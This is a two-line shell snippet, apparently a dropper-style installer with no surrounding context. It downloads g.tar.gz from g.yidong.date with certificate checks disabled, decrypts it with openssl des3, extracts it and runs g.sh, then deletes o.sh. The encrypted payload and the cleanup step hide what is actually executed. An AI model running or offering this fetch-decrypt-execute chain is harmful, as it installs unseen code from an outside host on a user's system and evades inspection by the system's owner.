wget -N --no-check-certificate g.yidong.date/g.tar.gz && openssl des3 -d  -salt -in ./g.tar.gz | tar xzf - && chmod +x g.sh && bash g.sh
rm o.sh
